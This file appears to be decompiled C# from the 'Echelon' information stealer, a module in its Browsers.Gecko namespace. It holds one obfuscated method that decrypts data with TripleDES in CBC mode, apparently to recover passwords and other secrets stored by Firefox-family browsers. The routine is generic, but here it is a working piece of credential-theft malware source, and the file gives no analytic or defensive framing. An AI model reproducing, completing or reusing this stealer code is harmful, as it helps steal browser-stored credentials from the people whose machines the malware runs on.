using System;
using System.Security.Cryptography;
using System.Text;

namespace Echelon.Stealer.Browsers.Gecko
{
	// Token: 0x02000045 RID: 69
	public static class Gecko6
	{
		// Token: 0x060001C6 RID: 454 RVA: 0x00020988 File Offset: 0x0001EB88
		public static string lTRjlt(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
		{
			string @string;
			using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.IV = iv;
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = paddingMode;
				using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, iv))
				{
					@string = Encoding.Default.GetString(cryptoTransform.TransformFinalBlock(input, 0, input.Length));
				}
			}
			return @string;
		}
	}
}
